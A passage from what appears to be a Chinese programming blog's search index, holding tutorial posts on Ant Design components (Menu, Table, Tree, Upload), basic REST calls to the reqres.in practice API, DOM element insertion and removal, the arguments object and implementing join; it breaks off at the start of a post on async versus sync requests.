1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192@import '~antd/dist/antd.css';.demo-layout-wrapper { color: white; .demo-layout-header { display: flex; align-items: center; height: 70px; background-color: #002140; .demo-layout-header-left { margin-right: 40px; .demo-layout-header-logo { width: 100px; height: 40px; background: #f2f2f2; } } .demo-layout-header-right { width: 100%; .ant-menu { border: 0; background: inherit; color: white; .ant-menu-item { &amp;.ant-menu-item-selected { &amp;::after { display: none; } } &amp;.ant-menu-item-active { background: #419ffb; color: white; } } } } } .demo-layout-content { background-color: #f2f2f2; padding: 20px 50px; min-height: calc(100vh - 70px - 60px); .demo-layout-content-main { background-color: white; padding: 20px; margin-top: 20px; .demo-layout-content-main-title { font-size: 24px; color: #444; } .demo-layout-content-main-detail { .demo-layout-content-main-detail-rate { margin-bottom: 10px; } .demo-layout-content-main-detail-description { color: #444; } .demo-layout-content-main-detail-prize { margin-bottom: 15px; span { text-decoration: underline; } } .demo-layout-content-main-detail-button { margin-top: 25px; .ant-btn { background-color: #339cff; color: white; padding: 8px 16px; height: auto; border: none; box-shadow: none; &amp;:hover { opacity: 0.8; } } } } } } .demo-layout-footer { height: 60px; padding: 20px; text-align: center; color: white; background-color: #002140; font-size: 0.8rem; p { margin-bottom: 0; } }}","link":"/2022/09/22/antd-layout/"},{"title":"Ant Design－Menu","text":"網頁中最重要的一部分。 基本結構附註：如果是 &lt;= 4.20 的話得用 JSX 的寫法 會由 Menu、Menu.Item、Menu.SubMenu 和 Menu.ItemGroup 來組成： 1234567891011121314151617181920212223242526import React, { useState } from 'react'import { Menu } from 'antd'function Main() { return ( &lt;Menu mode='horizontal' defaultSelectedKeys={['home']}&gt; &lt;Menu.Item key='home'&gt;Home&lt;/Menu.Item&gt; &lt;Menu.Item key='about'&gt;About&lt;/Menu.Item&gt; &lt;Menu.SubMenu key='products' title='Products'&gt; &lt;Menu.ItemGroup title='Type A'&gt; &lt;Menu.Item key='a1'&gt;ProductA-1&lt;/Menu.Item&gt; &lt;Menu.Item key='a2'&gt;ProductA-2&lt;/Menu.Item&gt; &lt;Menu.Item key='a3'&gt;ProductA-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;Menu.ItemGroup title='Type B'&gt; &lt;Menu.Item key='b1'&gt;ProductB-1&lt;/Menu.Item&gt; &lt;Menu.Item key='b2'&gt;ProductB-2&lt;/Menu.Item&gt; &lt;Menu.Item key='b3'&gt;ProductB-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;/Menu.SubMenu&gt; &lt;Menu.Item key='contact'&gt;Contact&lt;/Menu.Item&gt; &lt;/Menu&gt; )}export default Main 出來的結果大概就像這樣 如果是 &gt;= 4.20 的話，可以改用 props 的方式來寫（官方也推薦這樣用）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import { Menu } from 'antd'const items = [ { key: 'home', label: 'Home' }, { key: 'about', label: 'About' }, { key: 'producrs', label: 'Products', // submenu children: [ // group1 { type: 'group', label: 'Type A', children: [ { key: 'a1', label: 'ProductA-1' }, { key: 'a2', label: 'ProductA-2' }, { key: 'a3', label: 'ProductA-3' } ] }, // group2 { type: 'group', label: 'Type B', children: [ { key: 'b1', label: 'ProductB-1' }, { key: 'b2', label: 'ProductB-2' }, { key: 'b3', label: 'ProductB-3' } ] } ] }, { key: 'service', label: 'Service' }]export default function App() { return &lt;Menu items={items} mode='horizontal' defaultSelectedKeys={['home']} /&gt;} 至於 active 的狀態它會自己幫你處理，所以不用額外設定。 自己處理 active 狀態如果你想要自己設定 active 狀態的話，可以用 selectedKeys 來處理： 1234567891011121314151617181920212223242526272829303132333435import React from 'react'import type { MenuProps } from 'antd'import { Menu } from 'antd'function Main() { const [current, setCurrent] = React.useState&lt;string[]&gt;(['home']) const handleClick: MenuProps['onClick'] = (e) =&gt; { // 顯示點擊項目的 key（我們設的那個） console.log('click', e.key) setCurrent([e.key]) } return ( &lt;Menu mode='horizontal' onClick={handleClick} selectedKeys={current}&gt; &lt;Menu.Item key='home'&gt;Home&lt;/Menu.Item&gt; &lt;Menu.Item key='about'&gt;About&lt;/Menu.Item&gt; &lt;Menu.SubMenu key='products' title='Products'&gt; &lt;Menu.ItemGroup title='Type A'&gt; &lt;Menu.Item key='a1'&gt;ProductA-1&lt;/Menu.Item&gt; &lt;Menu.Item key='a2'&gt;ProductA-2&lt;/Menu.Item&gt; &lt;Menu.Item key='a3'&gt;ProductA-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;Menu.ItemGroup title='Type B'&gt; &lt;Menu.Item key='b1'&gt;ProductB-1&lt;/Menu.Item&gt; &lt;Menu.Item key='b2'&gt;ProductB-2&lt;/Menu.Item&gt; &lt;Menu.Item key='b3'&gt;ProductB-3&lt;/Menu.Item&gt; &lt;/Menu.ItemGroup&gt; &lt;/Menu.SubMenu&gt; &lt;Menu.Item key='contact'&gt;Contact&lt;/Menu.Item&gt; &lt;/Menu&gt; )}export default Main 跟 React router 結合起來如果可以透過一份資料，就自動產生 Menu 跟 Router 的話是不是挺方便的？這個其實是有辦法做到的！這邊會先介紹 &gt;= 4.20 的方法，比較簡潔一點。 假設 Menu 會有四個連結： Home Products Service About 那導覽列的部分就會這樣寫： 1234567891011121314151617181920212223const menu = [ { key: 'home', label: 'Home' }, { key: 'products', label: 'Products' }, { key: 'service', label: 'Service' }, { key: 'about', label: 'About' }]fucntino Nav () { return &lt;Menu items={menu} /&gt;} 路由的部分則會這樣寫： 12345678910function Main() { return ( &lt;Routes&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='products' element={&lt;Products /&gt;} /&gt; &lt;Route path='service' element={&lt;Service /&gt;} /&gt; &lt;Route path='about' element={&lt;About /&gt;} /&gt; &lt;/Routes&gt; )} 好，接下來可以思考一件事： 有沒有辦法讓 menu 也能渲染 router？ 你可以先想想看如果要讓 router 也能共用的話，還需要哪些資料？ 想完後再拉下去看，最後會整理成像這樣： 1234567891011121314151617181920212223242526272829303132import { Link } from 'react-router-dom'import Home from './Home'import About from './About'import Prodcuts from './Prodcuts'import Service from './Service'const menu = [ { key: 'home', path: '', label: &lt;Link to=''&gt;Home&lt;/Link&gt;, component: &lt;Home /&gt; }, { key: 'products', path: 'products', label: &lt;Link to='products'&gt;Products&lt;/Link&gt;, component: &lt;Products /&gt; }, { key: 'service', path: 'service', label: &lt;Link to='service'&gt;Service&lt;/Link&gt;, component: &lt;Service /&gt; }, { key: 'about', path: 'about', label: &lt;Link to=''&gt;About&lt;/Link&gt;, component: &lt;About /&gt; }] 首先需要讓導覽列上的按鈕可以連結到路由，所以把 label 的部分改成 &lt;Link&gt; 的形式。（如果希望不要有連結，可以保留為純文字就好） 接著 router 的部分因為要渲染出 &lt;Route path=\"path\" element={&lt;Component /&gt;} /&gt; 的形式，所以加上 path 跟 component 的屬性。 資料 OK 以後，接著只要把渲染函式寫出來就可以了： 12345678910111213// 資料import { menu } from './menu'// 渲染函式function renderRoute(routes) { return routes.map((route) =&gt; ( &lt;Route key={route.key} path={route.path} element={route.component} /&gt; ))}function RouteComponent() { return &lt;Routes&gt;{renderRoute(menu)}&lt;/Routes&gt;} 做到這邊以後，就可以透過 menu 來自動生成導覽列跟路由了，想看範例的話到 這邊 看。 &lt;= 4.20 的做法如果是 &lt;=4.20 的話，&lt;Menu /&gt; 不能用 items 屬性，所以就要自己寫一個 generator 來產生： 123456789function Nav() { return ( &lt;Menu&gt; {menu.map((menu) =&gt; ( &lt;Menu.Item key={menu.key}&gt;{menu.label}&lt;/Menu.Item&gt; ))} &lt;/Menu&gt; )} 也沒有很複雜，只是順便提一下。 子路由與子導覽列這邊只是做個補充，基本概念都跟上面一樣，只是資料更多層，還有渲染函式稍微複雜一點： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// Nav.tsximport React from 'react'import { Menu } from 'antd'import { Link, Outlet } from 'react-router-dom'import Home from '../pages/Home'import ProdcutA from '../pages/ProductA'import ProdcutB from '../pages/ProductB'export const items = [ { key: 'home', url: '', label: &lt;Link to=''&gt;Home&lt;/Link&gt;, component: &lt;Home /&gt; }, { key: 'products', url: 'products', label: 'Products', component: &lt;Outlet /&gt;, // 子路由 &amp; 子導覽 children: [ { key: 'A', url: 'productA/*', label: &lt;Link to='products/productA'&gt;ProdcutA&lt;/Link&gt;, component: &lt;ProdcutA /&gt; }, { key: 'B', url: 'productB/*', label: &lt;Link to='products/productB'&gt;ProdcutB&lt;/Link&gt;, component: &lt;ProdcutB /&gt; } ] }]const Header: React.FC = () =&gt; { return ( &lt;&gt; {/* &lt;Menu mode=\"horizontal\"&gt; {items.map((item: any) =&gt; item.children ? ( &lt;Menu.SubMenu key={item.key} title={item.label}&gt; {item.children.map((subItem: any) =&gt; ( &lt;Menu.Item key={subItem.key}&gt;{subItem.label}&lt;/Menu.Item&gt; ))} &lt;/Menu.SubMenu&gt; ) : ( &lt;Menu.Item key={item.key}&gt;{item.label}&lt;/Menu.Item&gt; ) )} &lt;/Menu&gt; */} &lt;Menu mode='horizontal' items={items} /&gt; &lt;/&gt; )}export default Header 123456789101112131415161718192021222324252627// RouteComponent.tsximport { Routes, Route } from 'react-router-dom'import Header from './components/Header'import { items } from './components/Header'function renderRoute(routes: any) { return routes.map((route: any) =&gt; route.children ? ( route.children.map((subRoute: any) =&gt; ( &lt;Route key={route.key} path={route.url} element={route.component}&gt; &lt;Route key={subRoute.key} path={subRoute.url} element={subRoute.component} /&gt; &lt;/Route&gt; )) ) : ( &lt;Route key={route.key} path={route.url} element={route.component} /&gt; ) )}export default function App() { return ( &lt;&gt; &lt;Header /&gt; &lt;Routes&gt;{renderRoute(items)}&lt;/Routes&gt; &lt;/&gt; )} 想看範例的話一樣到 這邊 來看。","link":"/2022/05/22/antd-menu/"},{"title":"Ant Design－Table","text":"看起來複雜了點，不過理解後就還好了。 基本用法表格會用 &lt;Table /&gt; 來表示，並且接收 dataSource 跟 columns 這兩個 props。 dataSource 跟 columns 的值都是 Array，來看 code： 12345678910111213141516const dataSource = [ { key: '1', name: 'PeaNu', age: 23, address: '高雄市' }]const columns = [ { title: '姓名', dataIndex: 'name', key: 'name' }] 附註：key 是用來給 React 渲染列表用的，預設是用 key 來表示，但你也可以用 rowKey 來重新定義，後面會再解釋。 首先 dataSource 裡面會放我們要呈現的資料，等一下會跟 columns 來做映射。 而 columns 中最重要的欄位是 dataIndex，填入的東西就代表 dataSource 中的哪個 key？像上面填了 name，所以就會到 dataSource 找到 name: 'PeaNu' 然後顯示到畫面上；至於 title 的話是表格的欄位名稱。 上面的輸出結果如下： 重新設定 key 的值前面有說 key 這個值是用來給 React 渲染列表用的，不過如果資料是透過 API 取得的話，通常不會有 key 這個欄位，那怎麼辦？ 這時候就要在 &lt;Table /&gt; 加上 rowKey 這個屬性，告訴他「我要拿哪個欄位來當做 key」。 舉例來說，假設 API 拿到的資料如下： 123456789101112const dataSource = [ { userId: '1', name: 'PeaNu', gender: 'M' }, { userId: '2', name: 'PPB', gender: 'F' }] 那 &lt;Table /&gt; 就會長這樣： 1&lt;Table rowKey='userId' dataSource={dataSource} columns={columns} /&gt; 這樣就可以解決 key 的問題了。 巢狀的資料結構如果現在資料變成這樣： 12345678910const dataSource = [ { name: 'PeaNu', age: 23, address: '高雄市', family: { wife: 'PPB' } }] 那 columns 就得這樣寫： 123456const columns = [ { title: 'Wife', dataIndex: ['family', 'wife'] }] 如果現在又變成這樣： 123456789101112const dataSource = [ { name: 'PeaNu', age: 23, address: '高雄市', family: [ { wife: 'PPB' } ] }] 那 columns 就得這樣寫： 123456const columns = [ { title: 'Wife', dataIndex: ['family', '0', 'wife'] }] 重新設定輸出到畫面的值有時候我們從 API 拿到的值不會想直接放到畫面上，例如： 12345678910const dataSource = [ { name: 'PeaNu', gender: 'M' }, { name: 'PPB', gender: 'F' }] 這時候就可以用 render 這個屬性來處理： 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render: (typeChar: string): string =&gt; { return typeChar === 'F' ? '女' : '男' } }] 也可以用縮寫的方式來寫： 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render(value: string): string { return value === 'F' ? '女' : '男' } }] 想再任性一點嗎？你甚至可以直接回傳一個 JSX： 12345678910111213const columns = [ { title: 'Name', dataIndex: 'name' }, { title: 'Gender', dataIndex: 'gender', render(value: string): React.ReactElement { return typeChar === 'M' ? &lt;h1&gt;女&lt;/h1&gt; : &lt;h1&gt;男&lt;/h1&gt; } }] 加上事件處理除了 dataSource 跟 columns 以外，還有一個 onRow 屬性可以用，用起來會像這樣子： 123456789101112&lt;Table dataSource={testData} columns={testColumns} onRow={(record: any) =&gt; { return { onClick: (event) =&gt; { console.log('record', record) console.log('click') } } }}/&gt; onRow 會放一個 function，這個 function 會回傳一個物件，裡面就可以放 event 跟 handler。 至於 record 的值會是觸發事件的「那個欄位」的 dataSource 值。 我知道聽起來講超級無敵難懂，所以一步一步來解釋吧。 假設 dataSource 長這樣： 12345678910const dataSource = [ { name: 'PeaNu', gender: 'M' }, { name: 'PPB', gender: 'F' }] 然後我點了 PeaNu 那一排： 那 record 的值就會是： 1234{ name: 'PeaNu', gender: 'M'} 加上滾軸如果沒有做額外設定的話，預設的 &lt;Table /&gt; 會「自適應」做縮放，直到放不下時，會在視窗產生滾軸，像這樣： 有沒有辦法讓滾軸產生在「表格中」就好？還真的有，就是加上 scroll 屬性： 123456789&lt;Table rowKey='id' dataSource={testData} columns={testColumns} scroll={{ x: 1000, y: 150 }}/&gt; 裡面要傳一個物件，然後指定 x 軸和 y 軸的「寬度」。這兩個的行為不太一樣，要分清楚。 y 軸的概念比較簡單，想成是總高度就好。例如我設為 150，那表格的高度就會固定成 150px，當資料超過 150px 的話就會產生滾軸。 至於 x 軸的部分，你可以這樣記「當視窗小於 x 時，我希望表格的寬度有多寬」。所以我設為 1000 時，就代表當視窗寬度低於 1000 時表格的寬度會固定在 1000px，然後產生滾軸。 這樣會好記一點，所以這樣記就好。 加上排序和過濾如果我有這樣的表格： 我希望可以加上升冪跟降冪排序的選項，那我可以在 columns 加上這樣的設定： 1234567891011121314151617181920const columns = useRef([ { title: 'User id', dataIndex: 'id', // 這個就跟 array.sort 的用法一樣 sorter: (a: any, b: any) =&gt; a.id - b.id }, { title: 'First name', dataIndex: 'first_name' }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) 也可以加上預設值，不過要注意一下 type 的問題，沒設定好的話會出錯： 12345678910111213141516171819202122// 記得指定 type，否則會出錯const columns = useRef&lt;any[]&gt;([ { title: 'User id', dataIndex: 'id', sorter: (a: any, b: any) =&gt; a.id - b.id, // ascend | descend defaultSortOrder: 'ascend' }, { title: 'First name', dataIndex: 'first_name' }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) 接著，如果我希望加上過濾的功能，像這樣： 那就要在 columns 上加上兩個東西： filters，一個 Array onFilter，一個 function 一樣來看 code 解釋： 123456789101112131415161718192021222324252627282930313233343536373839404142const columns = useRef&lt;any[]&gt;([ { title: 'User id', dataIndex: 'id' }, { title: 'First name', dataIndex: 'first_name', // 用來顯示下拉選單的「顯示文字」跟「資料值」 filters: [ { text: 'George', value: 'George' }, { text: 'Janet', value: 'Janet' }, { text: 'Emma', value: 'Emma' } ], onFilter: (value: any, record: any) =&gt; { // record 會遍歷 dataSource 的每一筆資料 // value = filters 中設定的值 console.log('value', value) console.log('record', record) console.log('filter', record.first_name === value) // 這邊想成是 Array.filter 的邏輯就好 return record.first_name === value } }, { title: 'Last name', dataIndex: 'last_name' }, { title: 'Email', dataIndex: 'email' }]) 這樣就可以實現過濾的功能了。 結尾最後綜合以上所學，我做了一個簡單的範例，有需要的話可以去參考看看。","link":"/2022/05/15/antd-table/"},{"title":"Ant Design－Tree","text":"比較少會碰到的元件。 基本用法 沒有任何功能，只單純顯示資料： 12345678910111213141516171819202122232425262728293031323334353637383940414243import { Tree } from 'antd'import { DataNode } from 'antd/lib/tree'const AntdTree = () =&gt; { const treeData2: DataNode[] = [ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1' }, { title: 'A-2', key: 'A-2' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ] return ( &lt;div&gt; &lt;Tree treeData={treeData2} defaultExpandedKeys={['B']} /&gt; &lt;/div&gt; )}export default AntdTree 一個項目至少會有 title 跟 key 兩個 props，title 是顯示在畫面上的內容，key 則是拿來做操作時的一種參照。例如這邊一開始想讓 B 節點是展開的，就可以把 B 節點的 key 傳入 defaultExpandedKeys 就有這個效果了： 做成 Controlled Component 可以用 expandedKeys 設定展開的項目，再搭配 onExpand 來更新狀態就可以變成受控組件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import { Tree } from 'antd'import { DataNode } from 'antd/lib/tree'import { useState } from 'react'const AntdTree = () =&gt; { const [expandedKeys, setExpandedKeys] = useState&lt;React.Key[]&gt;([]) const treeData2: DataNode[] = [ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1', children: [ { title: 'A-1-1', key: 'A-1-1' } ] }, { title: 'A-2', key: 'A-2' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ] function handleExpand(expandedKeysValue: React.Key[]) { console.log('expand keys', expandedKeysValue) setExpandedKeys(expandedKeysValue) } return ( &lt;div&gt; &lt;Tree treeData={treeData2} expandedKeys={expandedKeys} onExpand={handleExpand} /&gt; &lt;/div&gt; )}export default AntdTree Draggable 要讓節點變成「可拖曳」項目的話要加上 draggable，並且在 onDrop 時來更新節點資料。 底下是一個簡單的範例，比較複雜的部分都是集中在 onDrop 的處理，所以請直接看註解會比較好理解一點： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134import { Tree } from 'antd'import { DataNode, TreeProps } from 'antd/lib/tree'import { useState } from 'react'const AntdTree = () =&gt; { const [treeData, setTreeData] = useState&lt;DataNode[]&gt;([ { title: 'A', key: 'A', children: [ { title: 'A-1', key: 'A-1', children: [ { title: 'A-1-1', key: 'A-1-1' } ] }, { title: 'A-2', key: 'A-2' }, { title: 'A-3', key: 'A-3' }, { title: 'A-4', key: 'A-4' } ] }, { title: 'B', key: 'B', children: [ { title: 'B-1', key: 'B-1' }, { title: 'B-2', key: 'B-2' } ] } ]) // onDrop 會傳入一個 info 參數，裡面可以拿到有用的資訊 const handleDrop: TreeProps['onDrop'] = (info) =&gt; { // drag 元素的 key const dragKey = info.dragNode.key // drog 元素的 key const dropKey = info.node.key // drop 位置（不精確） const dropPos = info.node.pos.split('-') // 精確位置（用來判斷是不是頂層第一個位置） const realDropPosition = info.dropPosition - Number(dropPos[dropPos.length - 1]) // 是不是放到縫隙間 const isDropToGap = info.dropToGap // 用來搜尋節點的 function const searchNode = ( data: DataNode[], key: React.Key, callback: (nodeData: DataNode, nodeIndex: number, nodeArray: DataNode[]) =&gt; void ) =&gt; { for (let i = 0; i &lt; data.length; i++) { const isMatchKey = data[i].key === key if (isMatchKey) { // 找到對應的 key，把資料和位置帶出去 return callback(data[i], i, data) } // 子節點存在，用遞迴搜尋 if (data[i].children) { searchNode(data[i].children!, key, callback) } } } // 複製原本的資料 const newTreeData = JSON.parse(JSON.stringify(treeData)) let dragObj: DataNode // 把 dragKey（被拖拉的節點）傳入，找出對應節點和位置 searchNode(newTreeData, dragKey, (nodeData, nodeIndex, nodeArray) =&gt; { // 把被拖拉的節點從陣列中刪除 nodeArray.splice(nodeIndex, 1) // 儲存被拖拉的節點資料 dragObj = nodeData console.log('dragObj', dragObj) }) // 如果不是插到中間 if (!isDropToGap) { // 把 dropKey（目標節點）傳入，找出對應節點陣列（因為不是插入所以不需要位置） searchNode(newTreeData, dropKey, (nodeData) =&gt; { // 如果 drop 的節點陣列有 children 就用它的，沒有就建立一個新的（空陣列） nodeData.children = nodeData.children || [] // 把 drag 節點放到最前面的位置 nodeData.children.unshift(dragObj) }) } // 如果是插到中間 else { // 把 dropKey（目標節點）傳入，找出節點陣列和位置 searchNode(newTreeData, dropKey, (nodeData, nodeIndex, nodeArray) =&gt; { console.log('nodeArray', nodeArray) console.log('dropDataIndex', nodeIndex) // -1 代表最頂層的第一個位置 if (realDropPosition === -1) { // 放到目標節點前面 nodeArray.splice(nodeIndex, 0, dragObj) } else { // 放到目標節點後面 nodeArray.splice(nodeIndex + 1, 0, dragObj) } }) } setTreeData(newTreeData) } return ( &lt;div&gt; &lt;Tree treeData={treeData} selectable={false} onDrop={handleDrop} draggable blockNode /&gt; &lt;/div&gt; )}export default AntdTree 實際範例可以參考 CodeSandbox","link":"/2023/03/16/antd-tree/"},{"title":"Ant Design－Upload 相關的 Props","text":"隨手記。 beforeUpload預設會在選取檔案後自動上傳（發 request），如果想取消這個行為可以用 beforeUpload 來處理： 123&lt;Upload beforeUpload={() =&gt; false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt; 只要回傳 false 就會取消了。 我們自己比較常做一些處理後在上傳，所以不常用到這個內建功能。 實際用途除了取消自動上傳以外，這個 function 也會接收兩個參數： 單個檔案（如果多選的話會重複呼叫這個 function） 組成 List 的檔案內容 例如說： 123456789function onFileSelect(file: File, fileList: File[]) { console.log('single file: ', file) console.log('file list: ', fileList) return false};&lt;Upload multiple={true} beforeUpload={onFileSelect} showUploadList={false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt; 當我選了兩個檔案後會輸出： 所以如果你想要對這些資料做處理的話，這是一個很不錯的 hook。 showUploadList預設在選完檔案後會自動生成檔案列表，可以用這個 props 來取消： 123&lt;Upload showUploadList={false}&gt; &lt;Button&gt;Upload&lt;/Button&gt;&lt;/Upload&gt;","link":"/2022/08/28/antd-upload-props/"},{"title":"基本的串接 API 練習","text":"簡單卻也實用。 簡述這裡會以 reqres 這個 API 來做基本的串接練習： GET 取得使用者資料 POST 新增使用者資料 DELETE 刪除使用者資料 PATCH 修改使用者資料 原始碼GET： 1234567const request = require('request')// argument variable，讓你可以 node index.js 「1」const { argv } = require('process')// GET 請求request(`https://reqres.in/api/users/${argv[2]}`, (error, response, body) =&gt; console.log(JSON.parse(body))) POST： 123456789101112const request = require('request')// 新增使用者資料request.post( { url: `https://reqres.in/api/users`, form: { name: 'PeaNu', job: 'F2E' } }, // 回應的內容 (error, response, body) =&gt; console.log(body)) response： 1{\"name\":\"PeaNu\",\"job\":\"F2E\",\"id\":\"204\",\"createdAt\":\"2022-01-03T13:55:49.725Z\"} DELETE： 12345678const request = require('request')// 刪除 users/2 的資料request.delete('https://reqres.in/api/users/2', (error, response, body) =&gt; { // 回應的狀態碼 console.log(response.statusCode) // 回應的內容 console.log('body:', body)}) response： 12204 // 成功，但我沒什麼想跟你說的body: // 所以 body 才會是空的 PATCH： 1234567891011121314151617const request = require('request')// 修改 users/2 的資料request.patch( { url: 'https://reqres.in/api/users/2', form: { name: 'PeaNu', job: 'F2E' } }, (error, response, body) =&gt; { // 回應的狀態碼 console.log(response.statusCode) // 回應的內容 console.log(body) }) response： 12200{\"name\":\"PeaNu\",\"job\":\"F2E\",\"updatedAt\":\"2022-01-04T06:33:38.211Z\"}","link":"/2022/01/04/api-practice/"},{"title":"用 DOM 插入或刪除元素","text":"又是你～ 重點不論是「新增」或「刪除」，都必須透過「父元素」來操作。 換句話說就是直接對元素使用的話會出錯，請務必記住這一點。 新增元素插到最前面 prepend備註：如果要新增多個可以 prepand(elem1, elem2) 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 12345678// 先選到要新增元素的父層const parent = document.querySelector('.block')// 建立新元素const newElement = document.createElement('div')// 寫一些文字newElement.innerText = 'R~Lo~Ha~'// 插到最前面parent.prepend(newElement) Output： 1234&lt;div class=\"block\"&gt; &lt;div&gt;R~Lo~Ha~&lt;/div&gt; yoyoyo&lt;/div&gt; 插到最後面 appendChild1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 12345678// 先選到要新增元素的父層const parent = document.querySelector('.block')// 建立新元素const newElement = document.createElement('div')// 寫一些文字newElement.innerText = 'R~Lo~Ha~'// 插到最後面parent.appendChild(newElement) Output： 1234&lt;div class=\"block\"&gt; yoyoyo &lt;div&gt;R~Lo~Ha~&lt;/div&gt;&lt;/div&gt; 一次新增多個元素突然發現有個 append 方法可以用： 123&lt;div class=\"block\"&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 12345678910// 先選到要刪除元素的父層const parent = document.querySelector('.block')// 要新增的第一個元素const elem1 = document.createElement('div')elem1.innerText = 'elem1'// 要新增的第二個元素const elem2 = document.createElement('div')elem2.innerText = 'elem2'// 插入兩個元素parent.append(elem1, elem2) Output： 12345&lt;div class=\"block\"&gt; &lt;p&gt;yoyoyo&lt;/p&gt; &lt;div&gt;elem1&lt;/div&gt; &lt;div&gt;elem2&lt;/div&gt;&lt;/div&gt; 插到父元素下的某個子元素前面 insertBefore123&lt;div class=\"parent\"&gt; &lt;div class=\"child\"&gt;child2&lt;/div&gt;&lt;/div&gt; 123456// 建立新元素const div = document.createElement('div')// 新元素內容div.innerText = 'child1'// 把 div 插到 child 前面document.querySelector('.parent').insertBefore(div, document.querySelector('.child')) Output： 1234&lt;div class=\"parent\"&gt; &lt;div&gt;child1&lt;/div&gt; &lt;div class=\"child\"&gt;child2&lt;/div&gt;&lt;/div&gt; 刪除元素方法一 removeChild123&lt;div class=\"block\"&gt; &lt;p class=\"child\"&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 123456// 先選到要刪除元素的父層const parent = document.querySelector('.block')// 要刪除的元素const deleteElement = document.querySelector('.child')// 刪除子元素parent.removeChild(deleteElement) Output： 1&lt;div class=\"block\"&gt;&lt;/div&gt; 方法二 remove123&lt;div class=\"block\"&gt; &lt;p class=\"child\"&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; JavaScript： 1234// 要刪除的元素const deleteElement = document.querySelector('.child')// 把自己刪除deleteElement.remove() 補充－新增文字節點如果你只想新增文字，但又不想用 innerText，因為會整筆覆寫掉。 這時候你可以改用 createTextNode 來處理： 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 123456// 先選到要新增元素的父層const parent = document.querySelector('.block')// 建立新文字內容const newText = document.createTextNode('a new text')// 插到最後面parent.appendChild(newText) Output： 1&lt;div class=\"block\"&gt;yoyoyo a new text&lt;/div&gt;","link":"/2022/01/18/append-or-delete-element/"},{"title":"函式中的 arguments 物件與 Array-like Object","text":"Deja vu. 關於 arguments 物件每一個 function 執行的時候都會被傳入一個 arguments 引數，它會儲存一些跟引數有關的資訊： 12345function add(a, b) { console.log(arguments) console.log(arguments[0] + arguments[1])}add(1, 10) 輸出： 12[Arguments] { '0': 1, '1': 3 }11 關於 Array-like Object不知道在剛剛你有沒有注意到 arguments 其實是一個「物件」，而不是陣列（儘管看起來很像）。 arguments 還有其他的屬性，像是： callee 被 call 的 function 自己 caller 誰（哪個物件）call 這個 function 的？ length 然後你仔細想想看，如果要你用「陣列」來實作 arguments 這個東西，應該會碰到一點問題： 12345678910var arguments = [ '0': argument1 '1': argument2 .... 'length', 'caller', 'callee'] 卡住了吧？因為聰明的你也知道陣列只能指定 value，沒辦法像物件一樣同時指定 key 跟 value。 即便 arguments 讓你可以用 arguments[n] 來存取引數，但為了儲存那些其他的資訊，還是只能用「物件」來實作，只是讓它感覺很像陣列罷了。 這種長的很像陣列的物件就稱作「Array-like Object」（還真是有夠人性化的取名方式） Array-like-object 的特性 可以用 for...of 來取值（因為 iterable） 不可以用 Array 的內建方法，例如 map()。必須先用 Array.from() 轉成陣列才可以。","link":"/2021/12/18/arguments-and-array-like-object/"},{"title":"實作 join 的三種方法","text":"來自 LIOJ 上的題目，因為另外兩個解法很有趣，所以想特別記錄一下。 解法一應該大部分的人都是這樣解的 =&gt; 碰到最後一個元素時，不加上分隔值： 12345678910111213141516function join(arr, separator) { let result = '' // 遍歷陣列元素 for(let i=0; i&lt;arr.length; i++) { // 不是最後一個元素才插值 if(i !== arr.length-1) { result += arr[i] + separator } else { // 最後一個元素直接填入 result += arr[i] } } // 回傳結果 return result}console.log(join(['1', '2', '3'], '!')) // 1!2!3 解法二如果先把第一個元素給排除，會發現後面都是同個規律 =&gt; 看成是 1 + !2 + !3： 123456789101112function join(arr, separator) { // 儲存第一個元素 let result = arr[0] // 從第二個元素開始取出 for(let i=1; i&lt;arr.length; i++) { // 分隔值 + 文字 result += separator + arr[i] } // 回傳結果 return result}console.log(join(['1', '2', '3'], '!')) // 1!2!3 解法三跟解法二的邏輯一樣，只是現在變成 =&gt; 1! + 2! + 3： 1234567891011function join(arr, separator) { let result = '' // 記得 -1 排除最後一個元素 for(let i=0; i&lt;arr.length-1; i++) { // 文字 + 分隔值 result += arr[i] + separator } // 補上最後一個元素值 return result + arr[arr.length-1]}console.log(join(['1', '2', '3'], '!')) // 1!2!3","link":"/2021/12/30/array-join-method/"},{"title":"從設錯參數來學習 async 與 sync 的差異","text":"真的有夠鬧。 來龍去脈這個錯誤是來自「程式導師實驗計畫第五期」week8 的進階挑戰題。 原本我是想做出「每抓到一筆資料就更新 DOM 來顯示獎品數量」，像這樣： 但我犯了一個很蠢的錯誤，就是把 XMLHttpRequest.send() 的第三個參數（async）寫錯，讓每一次 request 